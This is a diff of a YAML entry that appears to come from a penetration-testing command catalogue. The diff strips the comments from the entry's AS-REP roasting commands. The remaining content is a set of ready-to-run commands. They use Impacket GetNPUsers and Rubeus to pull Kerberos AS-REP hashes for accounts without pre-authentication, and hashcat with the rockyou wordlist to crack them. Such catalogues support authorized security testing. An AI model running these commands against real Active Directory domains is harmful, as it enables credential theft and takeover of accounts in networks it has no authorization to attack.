@@ -4,17 +4,9 @@ description: |
 commands:
   - have: Username
     cmd: |
-      # Extract AS-REP hashes for users with pre-auth disabled (Impacket)
       impacket-GetNPUsers senshu.sh/ -usersfile users.txt -dc-ip 10.10.10.27 -no-pass -request
-
-      # Rubeus — AS-REP Roast from a Windows session
       .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
-
-      # Crack AS-REP hashes with hashcat
       hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
-
-      # Note: targets accounts with "Do not require Kerberos preauthentication" enabled
-      # Only a username list is needed — no password required
 phase:
   - Exploitation
 target_os:
